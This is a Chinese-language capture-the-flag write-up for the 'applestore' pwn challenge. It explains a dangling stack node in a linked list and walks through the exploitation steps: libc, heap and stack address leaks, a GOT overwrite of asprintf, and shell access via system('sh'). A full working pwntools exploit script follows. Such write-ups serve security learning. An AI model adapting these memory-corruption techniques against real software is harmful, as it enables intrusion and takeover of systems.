# 执行环境
- 运行环境
  - Ubuntu 16.04
  - libc 2.23（与二进制文件链接的libc）
- 缓解措施
  - ASLR: on
  - PIE: off（程序基址为0x08048000）
  - NX: on（未明确显示，但通常开启）
  - RELRO: Partial RELRO（GOT可写）
  - Canary: on（栈保护已启用）
  - FORTIFY: off

# 漏洞成因
## 程序关键结构体
程序使用链表管理购物车项目，每个节点为以下结构体：
```c
struct item {
    char *name;          // 指向设备名称字符串的指针，偏移0
    int price;           // 设备价格，偏移4
    struct item *next;   // 指向下一个节点的指针，偏移8
    struct item *prev;   // 指向前一个节点的指针，偏移12
};
```
全局变量`dword_804B070`指向链表头部。

## 漏洞定位
漏洞位于`checkout`函数中。当购物车总价恰好为7174时，程序会在栈上创建一个`item`节点（局部变量`v2[5]`）并将其插入链表。该节点在`checkout`函数返回后变为悬空指针，但链表仍保留对其的引用。通过后续操作覆盖栈上的该节点数据，可实现任意地址读写。
```c
unsigned int checkout()
{
  // ...
  if ( v1 == 7174 )
  {
    puts("*: iPhone 8 - $1");
    asprintf(v2, "%s", "iPhone 8"); // v2[0]指向堆分配的字符串
    v2[1] = (char *)1;              // 价格
    insert((int)v2);                // 将栈地址插入链表
    v1 = 7175;
  }
  // ...
}
```

# 漏洞利用过程
利用过程分为以下步骤：通过添加特定商品使总价达到7174，触发栈节点插入；利用`cart`函数覆盖栈节点内容，泄露libc和堆地址；遍历链表获取栈节点地址；利用`delete`函数构造任意写修改GOT；最终触发`asprintf`调用执行`system("sh")`。

## Step1~2
**Step1**：添加10个设备4（iPad Mini 3, $399）和16个设备1（iPhone 6, $199），总价7174。调用`checkout`后，栈地址`stack_node`（位于`checkout`的栈帧中）被插入链表，成为第27个节点。此时链表结构为：头节点指向堆节点1，依次链接，第26个堆节点的`next`指向栈节点`stack_node`，栈节点的`prev`指向第26个堆节点，`next`为NULL。

**Step2**：调用`cart`函数，发送payload `b'y\x00' + p32(elf.got['read']) + p32(0)*3`。`cart`的局部变量`buf`覆盖了`stack_node`的位置（因为`checkout`已返回，栈帧重用），将栈节点的`name`字段覆盖为`read`的GOT地址。当`cart`遍历链表打印第27个节点时，以`read`的GOT条目值为字符串指针打印，泄露`read`函数地址`libc_read_addr`。计算libc基址：`libc_base = libc_read_addr - libc.symbols['read']`。

## Step3~4
**Step3**：类似Step2，发送payload `b'y\x00' + p32(0x0804B070) + p32(0)*3`，将栈节点的`name`字段覆盖为全局变量地址。`cart`打印时，从`0x0804B070`读取值（链表头指针`heap_head`）作为字符串指针，泄露堆地址`heap_head`。

**Step4**：调用`get_stack_addr(heap_head)`，通过26次循环遍历链表。每次循环发送payload覆盖栈节点的`name`字段为当前节点的`next`指针地址（`addr+8`），泄露`next`指针值并更新`addr`。26次后得到栈节点地址`stack_addr`（即第27个节点的地址）。

## Step5
**Step5**：调用`delete`函数删除第27个节点。发送payload `b'27' + p32(0)*2 + p32(stack_addr+0x20-0xc) + p32(elf.got['asprintf']+0x22)`。`delete`的局部变量`nptr`覆盖栈节点，将其`next`字段覆盖为`stack_addr+0x14`（即`stack_addr+0x20-0xc`），`prev`字段覆盖为`asprintf_got+0x22`。执行移除操作时：
- 由于`prev`非空，执行`*(prev + 8) = next`，即`*(asprintf_got+0x2a) = stack_addr+0x14`，向`asprintf`的GOT条目附近写入栈地址。
- 由于`next`非空，执行`*(next + 12) = prev`，即`*(stack_addr+0x20) = asprintf_got+0x22`，向栈地址写入GOT地址。

此操作实质上是将`asprintf`的GOT条目修改为指向栈地址`stack_addr+0x14`，为控制流劫持做准备。

## Step6~7
**Step6**：程序后续调用`asprintf`时（如`cart`或`checkout`中的`asprintf`），控制流跳转到栈地址`stack_addr+0x14`。发送payload `b'sh\x00\x00' + p32(system_addr)`，该内容位于栈上`stack_addr+0x14`处，使得`asprintf`被劫持为执行`system("sh")`。

**Step7**：获取shell，进行交互。

# Exploit：
```python
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/bin/heap23_11_pwnable_applestore')
elf = ELF('./data/bin/heap23_11_pwnable_applestore')
libc = elf.libc

def add(index,count):
    for i in range(count):
        p.recvuntil(b'>')
        p.sendline(b'2')
        p.recvuntil(b'Device Number> ')
        p.sendline(str(index).encode())

def init():
    p.recvuntil(b'>')
    p.sendline(b'5')                     # 调用checkout
    p.recvuntil(b'Let me check your cart. ok? (y/n) > ')
    p.sendline(b'y')

def leak(payload):
    p.sendline(b'4')                     # 调用cart
    p.recvuntil(b'Let me check your cart. ok? (y/n) > ')
    p.sendline(payload)                  # 覆盖栈节点name字段
    p.recvuntil(b'27: ')                 # 第27个节点为栈节点
    return u32(p.recv(4))               # 泄露4字节地址

def delete(payload):
    p.recvuntil(b'>')
    p.sendline(b'3')                     # 调用delete
    p.recvuntil(b'Item Number> ')
    p.sendline(payload)                  # 覆盖栈节点并指定删除项

def get_stack_addr(addr):
    for i in range(26):
        payload=b'y\x00' + p32(addr+8)+p32(0)+p32(0)+p32(0)
        addr = leak(payload)             # 遍历链表next指针
    return addr

# Step1: 触发栈节点插入
add(4,10);add(1,16);init()

# Step2: 泄露libc地址
payload=b'y\x00' + p32(elf.got['read'])+p32(0)+p32(0)+p32(0)
data = leak(payload)
libc_base = data - libc.symbols['read']
libc.address = libc_base
system_addr = libc.symbols['system']
bin_sh_addr = next(libc.search(b'/bin/sh'))

# Step3: 泄露堆地址
payload=b'y\x00' + p32(0x0804B070)+p32(0)+p32(0)+p32(0)
heap_addr = leak(payload)

# Step4: 获取栈节点地址
stack_addr = get_stack_addr(heap_addr)

# Step5: 构造任意写修改asprintf的GOT
payload=b'27' + p32(0) + p32(0) + p32(stack_addr+0x20-0xc) + p32(elf.got['asprintf']+0x22)
delete(payload)

# Step6: 触发asprintf调用system("sh")
payload=b'sh\x00\x00'+p32(system_addr)
p.sendline(payload)

# Step7: 交互
p.interactive()
```